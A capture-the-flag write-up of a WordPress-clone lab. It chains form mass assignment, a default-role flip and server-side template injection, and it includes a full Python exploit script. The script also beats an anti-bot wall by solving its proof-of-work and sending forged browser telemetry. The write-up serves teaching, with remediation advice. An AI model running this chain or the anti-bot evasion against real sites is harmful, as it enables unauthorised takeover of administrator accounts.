---
title: WordMess - Born an Administrator
tags:
  - bugforge
  - mass-assignment
  - broken-access-control
  - privilege-escalation
  - template-injection
  - anti-bot-bypass
  - chain
aliases:
  - "/bugforge/wordmess-privesc/"
---
- A WordPress clone with a proof-of-work anti-bot wall, where every new account is locked to the subscriber role
- Two unguarded write endpoints chained together: a profile form that accepts any `meta[...]` key, and a settings form that accepts any `options[...]` key
- The trick: never "become" admin. Change what the app considers the default role, then register a fresh account that is born an administrator

## TL;DR

```
[1] Forgeflare anti-bot: GET /forgeflare/challenge -> solve sha256 PoW (16 zero bits)
    POST /forgeflare/verify -> 60s clearance cookie

[2] Register user1 (subscriber). Login. Open the profile page.
    The profile form has meta[wm_bio] and meta[wm_social].
    We add two extra keys it never offered:
        meta[wm_capabilities][moderate_comments] = 1
        meta[wm_capabilities][list_users]       = 1
    -> server saves them. user1 now passes the permission check for
       /wp-admin/options-discussion.php (the Discussion settings page).

[3] On that page, the form has 3 comment options.
    We add one key it never offered:
        options[default_role] = administrator
    -> server saves it. Every account registered from now on IS an admin.

[4] Register user2. Login. Full admin menu: Plugins, Users, Theme Editor.

[5] Theme editor: append <?wm process.env.FLAG ?> to the footer template.
    Fetch the homepage. The flag renders into the footer.
```

## The Setting

- WordMess is a Node/Express clone of WordPress running behind "Forgeflare", a Cloudflare-style anti-bot layer. The `wp-admin` area is the attack surface:

```
GET/POST  /wp-login.php?action=register   - self-service registration (role: always subscriber)
GET/POST  /wp-login.php                   - login
GET/POST  /wp-admin/profile.php           - your own profile (subscriber)
GET/POST  /wp-admin/options-discussion.php - Discussion settings (needs capabilities)
GET/POST  /wp-admin/theme-editor.php      - edits the homepage footer template (admin only)
GET/POST  /wp-admin/plugins.php           - admin only
GET       /wp-admin/users.php             - needs list_users capability
```

- A subscriber who logs in sees a menu with exactly two items: Posts (`edit.php`) and Profile (`profile.php`).
  - Everything admin-flavored returns 403.

- The lab's flag lives in the `FLAG` environment variable on the server. 
- The only template tag that can reach it is the theme editor, which is admin only. 
- So the whole challenge reduces to one question: how does a subscriber become an administrator when the register endpoint hardcodes the subscriber role?

### Hint Decode

- The challenge hint is: "Can you escalate your privileges?"

- That points at the privilege-escalation family: broken access control, mass assignment, role confusion etc. 
- It does NOT point at memory corruption or some exotic parser bug. 
- Somewhere, this app decides what you are allowed to do based on data you can influence. 
- The work is finding which data, and which influence.


## Layer 1: The Wall (Forgeflare)

- Every request to the lab first has to get past Forgeflare, the anti-bot layer

1. A plain request gets a 403 challenge page instead of the app.
2. The page embeds JSON: a token, a number `n`, and a `difficulty` (16).
3. You must find a `nonce` so that `sha256(n + ':' + nonce)` starts with at least 16 zero bits.
4. You POST the nonce back with a telemetry payload that claims to be a human browser (`webdriver: false`, some mouse moves, an empty honeypot field).
5. The server sets a `forgeflare_clearance` cookie valid for 60 seconds.

- Two properties make it beatable. 
  - The proof-of-work is trivial at difficulty 16 (about one second of hashing in pure Python), and the "is this a real browser" signals are all client-supplied and never verified. 
  - The exploit script later in this post solves it automatically and re-solves it whenever the 60-second cookie expires mid-chain.

- If the terms are new: a *nonce* is just a number you are trying to guess. 
  - You try 1, 2, 3, ... until the hash of `n:nonce` happens to start with four zeroes (16 zero bits = 4 zero hex characters, since each hex character carries 4 bits). 
  - Roughly 1 in 65,536 hashes wins.

## Layer 2: The Vulnerability Class

This is the part most people have not seen. Take a moment with it.

### What is mass assignment?

When you submit a form, the server receives a bag of key/value pairs. Somewhere in the code it has to copy those values into a database record. There are two ways to do it:

```
ALLOWLIST (safe):                    DENYLIST / blind merge (unsafe):
user.display_name = form["display_name"]   for key in form:
user.email        = form["email"]               user[key] = form[key]
user.bio          = form["bio"]             # whatever the client sent
# only these 3 fields can ever change      # any key the client invented, too
```

- The safe version names exactly which fields the client may set. 
- The unsafe version trusts the client to send a reasonable set of keys. 
  - The moment the client can add a key that was never in the form - especially a key the app uses internally for permissions - the client is writing to the database with the developer's own pen.

- This class of bug is called *mass assignment*. 
- The classic victim field is `role` or `isAdmin`. 
- In this lab, the register endpoint hardcodes `role=subscriber` and ignores any role-ish field you attach.

- However... mass assignment is not one field. 
  - It is a *seam*: every place where client data is merged into a record. 
  - This app has two such seams, and neither is the obvious `role` field.

### Seam 1: the profile form and `meta[...]`

The profile form offers the user exactly five fields:

```html
<input type="hidden" name="_wpnonce" value="feaec4b04a">
<input type="text"   name="display_name" value="atk1">
<input type="email"  name="email" value="atk1@example.com">
<textarea           name="meta[wm_bio]">
<input type="text"   name="meta[wm_social" value="">
```

- `_wpnonce` is a CSRF token - a one-time code tied to your session that proves the form submission came from the real site. We are not bypassing it; we fetch the page, read the nonce out of the form, and submit it like an honest browser would. The bugs here are not CSRF bugs.

- The `meta[...]` keys are interesting. 
  - In this app, everything about a user that is not a core column (name, email, password) lives in one `meta` object, stored under whatever keys you send. 
  - The server saves the whole `meta` object you submit. And one of the keys this app reads back out of `meta` is `wm_capabilities` - the per-user permission list. 
  - WordPress stores exactly this data under `wp_capabilities` in real life; this clone just renamed it.

So... the profile form never offers `meta[wm_capabilities]`, but nothing stops us from adding it. The server merges our keys, unexamined, into the user record:

```
meta[wm_bio]                            -> bio field            (intended)
meta[wm_social]                         -> social field         (intended)
meta[wm_capabilities][moderate_comments]-> permission granted   (never intended)
```

- A subscriber can grant itself any capability, one form-post away. 
- We cannot grant "be administrator" - the admin menu checks more than capabilities, but we do not need to. 
- We need exactly two capabilities, chosen for what they unlock:

- `moderate_comments` -> unlocks `/wp-admin/options-discussion.php`
- `list_users` -> unlocks `/wp-admin/users.php`

The Discussion settings page is the prize.

### Seam 2: the settings form and `options[...]`

The Discussion settings form offers exactly three keys, all about comments:

```html
<input type="hidden" name="_wpnonce" value="bad1436ef3">
<input type="checkbox" name="options[comment_moderation]" value="1" checked>
<input type="checkbox" name="options[comment_registration]" value="1" >
<select             name="options[default_comment_status]"> ... </select>
```

Same shape, same seam. The server merges whatever `options[...]` keys arrive into the site's global options object. And one option that this app consults at registration time is `default_role`: the role assigned to a brand-new account. It defaults to `subscriber`.

The form never offers `options[default_role]`. Nothing stops us from adding it:

```
options[comment_moderation]     -> comment moderation flag   (intended)
options[default_comment_status] -> comment status           (intended)
options[default_role]           -> role of NEW registrations (never intended)
```

- That is the whole privilege escalation. 
- We did not attack any admin page, neither did we touch an admin account. 
- We changed one site-wide setting that the app itself uses to decide what a new user is, and then we made a new user.

### The two-account trick

Why register a second account instead of upgrading the first? Because the checks are asymmetric:

- `user1` modifies settings that `moderate_comments` grants access to. user1 stays a subscriber with two odd capabilities. 
  - It never reads an admin page.
- `user2` is created *after* `default_role=administrator` is in effect. 
  - At the moment of registration, before it has ever made a request, it already holds the administrator role. 
  - It logs in and the admin menu is simply there.

- Every request is made through a legitimate form, with a valid CSRF nonce, from a legitimately-registered account. 
- That is what makes this class of bug nasty: nothing on the wire looks like an attack. 
- Every individual request is one the app's own forms could have produced.

### Layer 3: the flag (template injection)

- Being admin unlocks the theme editor, a one-textarea page that writes the homepage footer template:

```
Current template:
Proudly powered by {{ blogname }} · © <?wm year ?> · <a href="/wp-json">REST API</a>
```

- That template is rendered on the server, and it supports `<?wm ... ?>` tags. 
- That is server-side template execution. 
- The homepage already contains `<?wm year ?>` - and the year of this page is being computed by the server, not typed in by anyone.

The lab stores its flag in the `FLAG` environment variable. So the payload is the least imaginative template tag possible:

```
<?wm process.env.FLAG ?>
```

Append it to the footer template, save, fetch the homepage:

```
Proudly powered by WordMess · © <?wm year ?> · REST API
bug{gogwUgXIofgUkZpvYlRHPl2akdYQokon}
```

The flag renders into the page footer for everyone - a nice touch: the "victim" delivers your loot to you.

## The Dead Ends

- Before I got here... I went through a full array of wrong turns first. 
- They are worth listing, because each one was ruled out with a new small bit learned and methodology updated...

- **Role mass assignment on register.** 20+ role-flavored fields (`role`, `roles`, `user_role`, `wp_capabilities`, `capabilities`, nested JSON variants). The endpoint hardcodes `subscriber`. Dead.
- **NoSQLi on login.** The login lookup is a MongoDB `findOne` on username, then `bcrypt.compare` on the password. Injecting an operator object into `pwd` crashes bcrypt with a 500 - and the session cookie is never set before the crash, so the crash leaks nothing usable. The only artifact is a user-existence oracle (500 = user exists, 401 = does not). Dead.
- **The batch endpoint.** The wp2shell batch route confusion is patched on this instance - no handler shift. Dead.
- **Session forging.** Sessions are server-side (`express-session`), so the cookie is just a signed pointer to server memory. Knowing the secret does not let you mint a role. Dead.
- **Admin passwords.** `admin` and `administrator` exist. 142 password candidates later, no luck. Dead.
- **REST query operator injection.** `$where` and friends in REST query parameters are ignored. Dead.

The main lesson, at least for me, was that the register endpoint and the login endpoint are the two places everyone looks first, and both were hardened. The two seams that shipped the flag are the boring profile form and the boring settings form - places where the developer thought "this form only edits bio and comments", and the code agreed with nobody.


## The Exploit, Step by Step

What follows is the actual request sequence that captured the flag. Five stages, each one a normal browser action.

### Stage 0: through the wall

```
GET  /                        -> 403, challenge page
POST /forgeflare/verify       -> forgeflare_clearance cookie (60s)
```

The script re-solves this automatically whenever a mid-chain request comes back 403.

### Stage 1: a normal subscriber

```
POST /wp-login.php?action=register
     user_login=atk1  user_email=atk1@example.com  pwd=...
     -> "Registration complete. You can log in."

POST /wp-login.php
     log=atk1  pwd=...  redirect_to=/wp-admin/
     -> logged in, session cookie set
```

### Stage 2: the capability grant

```
GET  /wp-admin/profile.php     -> form with _wpnonce, grabs it

POST /wp-admin/profile.php
     _wpnonce=feaec4b04a
     display_name=atk1
     email=atk1@example.com
     meta[wm_bio]=hello
     meta[wm_social]=
     meta[wm_capabilities][moderate_comments]=1     <- not a form field
     meta[wm_capabilities][list_users]=1           <- not a form field
     -> "Profile updated."
```

The proof it worked is visible one request later:

```
GET /wp-admin/options-discussion.php -> 200  (was 403)
GET /wp-admin/users.php              -> 200  (was 403)
GET /wp-admin/options-general.php    -> 403  (still - different capability)
GET /wp-admin/plugins.php            -> 403  (still - admin only)
```

### Stage 3: the default role flip

```
GET  /wp-admin/options-discussion.php -> form with _wpnonce

POST /wp-admin/options-discussion.php
     _wpnonce=bad1436ef3
     options[comment_moderation]=1
     options[comment_registration]=0
     options[default_comment_status]=open
     options[default_role]=administrator           <- not a form field
     -> "Settings saved."
```

### Stage 4: user2 is born

```
POST /wp-login.php?action=register
     user_login=atk2  user_email=atk2@example.com  pwd=...
     -> "Registration complete."

POST /wp-login.php  log=atk2  pwd=...  redirect_to=/wp-admin/

GET  /wp-admin/  -> the menu now reads:
     edit.php, edit-comments.php, plugins.php, users.php,
     options-discussion.php, theme-editor.php, options-general.php, profile.php
```

A brand-new account, registered through the public form, has the full administrator menu. No exploit was ever sent on its behalf.

### Stage 5: the template tag

```
GET  /wp-admin/theme-editor.php -> textarea + _wpnonce

POST /wp-admin/theme-editor.php
     _wpnonce=45521944a0
     template=<original footer> + "\n<?wm process.env.FLAG ?>"

GET  / -> flag rendered in the homepage footer
     bug{gogwUgXIofgUkZpvYlRHPl2akdYQokon}
```

## Why This Worked

1. **The profile endpoint merges client-supplied `meta[...]` keys without an allowlist.** The permission store (`wm_capabilities`) lives inside the same object the form edits. A subscriber grants itself capabilities.
2. **The settings endpoint merges client-supplied `options[...]` keys without an allowlist.** The registration role (`default_role`) lives inside the same object the form edits. A capability-holder changes what the next account becomes.
3. **The theme editor executes `<?wm ... ?>` template tags server-side.** An administrator reads environment variables through it. (On its own this is "working as designed"; combined with 1 and 2, it is the payload delivery.)

Bug 1 alone is bad but survivable. Bug 2 alone is nothing (no subscriber can reach the settings page). Together they are a clean full-takeover chain, and bug 3 turns takeover into the flag.

Notice what is NOT in the list: no CSRF bypass (every POST carried a valid nonce), no injection into a query, no desync, no secret cracking. Two forms, one settings key, one template tag.

## Attack Chain Diagram

```
                    +----------------------+
                    | forgeflare PoW solve |
                    +----------+-----------+
                               | clearance cookie (60s, auto-renewed)
                               v
                  +---------------------------+
                  | register user1 (subscriber)|
                  +------------+--------------+
                               |
                               v
          +-------------------------------------------+
          | profile.php: meta[wm_capabilities]        |   BUG 1
          | [moderate_comments]=1 [list_users]=1      |
          +---------------------+---------------------+
                               |
                               v
                 +-----------------------------+
                 | options-discussion.php 200 |
                 +--------------+--------------+
                                |
                                v
          +-------------------------------------------+
          | options[default_role]=administrator       |   BUG 2
          +---------------------+---------------------+
                               |
                               v
              +----------------------------------+
              | register user2 -> administrator   |
              +----------------+-----------------+
                               |
                               v
          +------------------------------------------+
          | theme-editor.php: <?wm process.env.FLAG?>|   BUG 3
          +---------------------+--------------------+
                               |
                               v
                  +---------------------+
                  | flag in the footer  |
                  +---------------------+
```

## Lessons

- **Mass assignment is a seam, not a field.** Hardening `role` on the register endpoint does nothing when the permission store is writable through the profile form. Audit every endpoint that writes a multi-key object, and ask what internal keys live in the same object.
- **Site-wide settings are privilege escalation in storage.** `default_role` changes what every FUTURE account is. Attackers read settings pages as "what can I make the app do to someone else".
- **Check what the permission system reads, not what it names.** This app's admin check is not "role == administrator" for every page - some pages check capabilities. A stored capability is as good as a role for the doors it opens.
- **CSRF tokens are not authorization.** Every malicious request here carried a valid nonce. CSRF defends cross-site request forgery, not a determined client writing keys the form never offered.
- **Dead ends are evidence too.** The hardened register and login endpoints pointed at the seams: an app that carefully validates its front door usually has not looked at its profile page.

## Remediation

For the developer side, the fixes are three one-liners in intent:

1. Allowlist the profile form: `meta` may only receive keys from `{wm_bio, wm_social}`. Reject unknown keys, and if `meta` must hold capabilities, store them OUTSIDE user-writable storage.
2. Allowlist the settings forms: `options-discussion.php` may only write `{comment_moderation, comment_registration, default_comment_status}`. `default_role` should be writable only from a page that itself requires `manage_options`.
3. Treat template editing as code deployment. Sandbox the tag evaluator to a function allowlist (no `process`, no `env`), or better, remove raw template editing from the admin UI entirely.

The general form: never `for key in form: record[key] = form[key]`. Every form should name its fields, and every merge should be an intersection with that list, not a trust of whatever arrived.

## The Script

The script below is self-contained - standard library only, no dependencies, no repo, no setup. It is written to be read as much as run: every block has a comment saying what it does and why. If you have never done this kind of thing before, read the walkthrough under the script after running it.

What you need: Python 3.8 or newer, and a lab URL.

```bash
python3 wordmess_privesc.py https://lab-XXXX.labs-app.bugforge.io
```

That is the whole interface. Here is the output from the run that captured this post's flag:

```
[*] Registering atk1_hftqfq (subscriber) ...
[*] Mass-assigning capabilities onto own profile ...
[*] Injecting options[default_role]=administrator ...
[*] Registering atk2_4veibl (born administrator) and logging in ...
[*] Injecting <?wm process.env.FLAG ?> into the footer ...
[+] FLAG: bug{gogwUgXIofgUkZpvYlRHPl2akdYQokon}
```

### The script, explained

- The chain steps are numbered and match the stages above.

```python
#!/usr/bin/env python3
"""
wordmess_privesc.py - self-contained exploit for the BugForge "WordMess weekly" lab.

Chain: register a subscriber -> mass-assign capabilities onto your own profile
-> flip the default role to administrator -> register a second account that is
born an admin -> inject a server-side template tag into the theme footer that
prints the FLAG environment variable.

Only uses the Python standard library. Python 3.8+.

Usage:
    python3 wordmess_privesc.py https://lab-XXXX.labs-app.bugforge.io
"""
import hashlib, json, random, re, string, sys, time
import urllib.request, urllib.error, urllib.parse
import http.cookiejar

# ---------------------------------------------------------------------------
# Why a fake browser User-Agent: the anti-bot layer (Forgeflare) rejects
# requests whose User-Agent looks like a script on EVERY request, before we
# even get to solve the puzzle. A plain "python-requests" UA never gets in.
# ---------------------------------------------------------------------------
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

# Telemetry = "prove you are a real browser" signals. The server asks for them
# but never verifies them, so a script can simply claim to be a well-behaved
# human. Plausible values only - zeros would look bot-like and get rejected.
TELEMETRY = {"mouseMoves": 42, "clicks": 1, "keys": 0, "scrolls": 2,
             "dwellMs": 5200, "webdriver": False, "plugins": 3,
             "languages": 2, "screen": 1920}


class LabSession:
    """An HTTP session that transparently solves the Forgeflare proof-of-work.

    Every request goes through this class. If the anti-bot layer answers
    with a 403 challenge page, we solve the puzzle, bank the 60-second
    clearance cookie, and retry the original request - the caller never
    sees the wall.
    """

    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        # CookieJar remembers the forgeflare clearance cookie AND the
        # WordPress login cookie across requests, exactly like a browser.
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    # -- raw HTTP ----------------------------------------------------------
    def _http(self, path, method="GET", data=None, headers=None):
        url = self.base + path
        h = {"User-Agent": UA, "Accept": "text/html,application/json",
             "Accept-Language": "en-US,en;q=0.9"}
        if headers:
            h.update(headers)
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, method=method, headers=h)
        try:
            r = self.opener.open(req, timeout=20)
            return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

    # -- Forgeflare proof-of-work ------------------------------------------
    def _solve_pow(self, challenge_html):
        """The challenge hides JSON in the page: {token, n, difficulty, to}.

        Task: find a nonce so that sha256(n + ':' + nonce) starts with at
        least `difficulty` ZERO BITS. Difficulty 16 = ~1 in 65536 hashes =
        well under a second in pure Python. Cheap for us, expensive for a
        naive scraper that has to redo it on every request.
        """
        m = re.search(r'<script id="ff-data"[^>]*>(.*?)</script>', challenge_html)
        c = json.loads(m.group(1))
        n, difficulty, nonce = c["n"], c["difficulty"], 0
        # difficulty 16 = 16 leading zero BITS = the hash's first 4 hex
        # characters are all "0" (every hex char is 4 bits). We just try
        # nonce = 1, 2, 3, ... until the hash wins the lottery.
        zeros = "0" * (difficulty // 4)
        while True:
            nonce += 1
            digest = hashlib.sha256(f"{n}:{nonce}".encode()).hexdigest()
            if digest.startswith(zeros):
                break
        verify = {
            "token": c["token"], "nonce": nonce, "to": c.get("to", "/"),
            "hp": "",               # honeypot MUST stay empty
            "telemetry": TELEMETRY,  # must include webdriver: false
        }
        body = json.dumps(verify).encode()
        req = urllib.request.Request(
            self.base + "/forgeflare/verify", data=body, method="POST",
            headers={"User-Agent": UA, "Content-Type": "application/json"})
        self.opener.open(req, timeout=20).read()
        # The Set-Cookie (forgeflare_clearance, 60s TTL) is now in the jar.

    def _clearance_ok(self, status, body):
        # A 403 whose body carries the challenge script = we hit the wall.
        return not (status == 403 and 'id="ff-data"' in body)

    # -- public helpers ----------------------------------------------------
    def get(self, path):
        status, body = self._http(path)
        if not self._clearance_ok(status, body):
            self._solve_pow(body)
            status, body = self._http(path)
        return status, body

    def post_form(self, path, fields):
        status, body = self._http(path, "POST", fields)
        if not self._clearance_ok(status, body):
            self._solve_pow(body)
            status, body = self._http(path, "POST", fields)
        return status, body


def field(html, name):
    """Pull one value out of an HTML form - a nonce, the current template."""
    m = re.search(rf'name="{re.escape(name)}" value="([^"]+)"', html)
    return m.group(1) if m else None


def rand_suffix():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def exploit(base):
    s = LabSession(base)

    # -- Step 1: two ordinary subscriber accounts ---------------------------
    # user1 will grant ITSELF extra capabilities via the profile form bug.
    # user2 will be registered AFTER the default role is flipped, so it is
    # BORN an administrator - never touching an admin-only page itself.
    user1, pw1 = "atk1_" + rand_suffix(), "Str0ngPass!x"
    user2, pw2 = "atk2_" + rand_suffix(), "Str0ngPass!y"

    print(f"[*] Registering {user1} (subscriber) ...")
    s.post_form("/wp-login.php?action=register",
                {"user_login": user1, "user_email": f"{user1}@x.com", "pwd": pw1})
    st, _ = s.post_form("/wp-login.php",
                        {"log": user1, "pwd": pw1, "redirect_to": "/wp-admin/"})
    assert st == 200, f"login failed: {st}"

    # -- Step 2: the mass-assignment (bug #1) -------------------------------
    # The profile form only offers meta[wm_bio] and meta[wm_social], but the
    # server writes ANY meta[...] keys you add. wp_capabilities is where
    # this app stores per-user permissions. We are a subscriber handing
    # ourselves the admin capabilities "moderate_comments" + "list_users".
    # Those two happen to unlock the Discussion settings page - the one
    # that controls what role NEW registrations get.
    print("[*] Mass-assigning capabilities onto own profile ...")
    st, page = s.get("/wp-admin/profile.php")
    fields = {
        "_wpnonce": field(page, "_wpnonce"),
        "display_name": user1, "email": f"{user1}@x.com",
        "meta[wm_bio]": "hello", "meta[wm_social]": "",
        "meta[wm_capabilities][moderate_comments]": "1",
        "meta[wm_capabilities][list_users]": "1",
    }
    s.post_form("/wp-admin/profile.php", fields)

    # -- Step 3: the option injection (bug #2) ------------------------------
    # The Discussion settings form only exposes 3 comment options, but the
    # server saves ANY options[...] key. default_role is the role assigned
    # to brand-new registrations. It is not in the form - we add it anyway.
    print("[*] Injecting options[default_role]=administrator ...")
    st, page = s.get("/wp-admin/options-discussion.php")
    fields = {
        "_wpnonce": field(page, "_wpnonce"),
        "options[comment_moderation]": "1",
        "options[comment_registration]": "0",
        "options[default_comment_status]": "open",
        "options[default_role]": "administrator",   # not a real form field
    }
    s.post_form("/wp-admin/options-discussion.php", fields)

    # -- Step 4: register the admin -----------------------------------------
    print(f"[*] Registering {user2} (born administrator) and logging in ...")
    s.post_form("/wp-login.php?action=register",
                {"user_login": user2, "user_email": f"{user2}@x.com", "pwd": pw2})
    s.post_form("/wp-login.php",
                {"log": user2, "pwd": pw2, "redirect_to": "/wp-admin/"})
    st, page = s.get("/wp-admin/")
    assert "theme-editor.php" in page, "user2 did not get admin nav - chain failed"

    # -- Step 5: template injection for the flag -----------------------------
    # The theme editor writes the homepage footer template. It supports
    # <?wm ... ?> server-side tags. process.env.FLAG is the environment
    # variable the challenge stores the flag in - rendering the homepage
    # after saving prints it straight into the page.
    print("[*] Injecting <?wm process.env.FLAG ?> into the footer ...")
    st, page = s.get("/wp-admin/theme-editor.php")
    cur = re.search(r'<textarea name="template"[^>]*>(.*?)</textarea>',
                    page, re.S).group(1)
    s.post_form("/wp-admin/theme-editor.php",
                {"_wpnonce": field(page, "_wpnonce"),
                 "template": cur + "\n<?wm process.env.FLAG ?>"})

    st, page = s.get("/")
    m = re.search(r'bug\{[^}]+\}', page)
    if not m:
        print("[!] chain completed but no flag rendered on the homepage")
        return None
    return m.group(0)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>", file=sys.stderr)
        sys.exit(2)
    flag = exploit(sys.argv[1])
    if flag:
        print(f"[+] FLAG: {flag}")
        sys.exit(0)
    sys.exit(1)


if __name__ == "__main__":
    main()
```

### Reading order

If you want to understand the chain rather than just run it:

1. `LabSession._solve_pow` - how the anti-bot puzzle is beaten. Twenty lines: hash counting plus a telemetry lie.
2. `exploit`, Step 2 - the mass-assignment. Two form keys that were never in the form.
3. `exploit`, Step 3 - the option injection. One settings key that was never in the form.
4. `exploit`, Step 4 - the two-account trick, and the `assert` that proves it worked before anything touches the theme editor.

If you just want the flag, run the script. It handles the anti-bot, the nonces, the accounts, and the template append, and prints the flag. The homepage footer will contain it too - the payload stays behind for anyone who loads the front page.
